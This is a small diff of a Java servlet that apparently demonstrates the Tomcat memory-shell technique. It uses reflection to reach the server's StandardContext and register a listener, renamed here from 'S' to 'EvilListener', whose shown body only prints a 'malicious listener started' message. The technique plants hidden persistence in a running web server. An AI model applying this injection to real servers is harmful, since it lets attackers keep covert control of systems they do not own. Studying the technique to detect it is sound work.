@@ -18,7 +18,7 @@ import java.lang.reflect.Field;
 public class InjectListener extends HttpServlet {
     @Override
     protected void doGet(HttpServletRequest req, HttpServletResponse resp) throws ServletException, IOException {
-        class S implements ServletRequestListener{
+        class EvilListener implements ServletRequestListener{
             @Override
             public void requestInitialized(ServletRequestEvent sre) {
                 System.out.println("恶意Listener启动");
@@ -47,7 +47,7 @@ public class InjectListener extends HttpServlet {
             stdctx.setAccessible(true);
             StandardContext standardContext = (StandardContext) stdctx.get(applicationContext);
 
-                S evilListener = new S();
+            EvilListener evilListener = new EvilListener();
             standardContext.addApplicationEventListener(evilListener);
 
         }catch (Exception e){
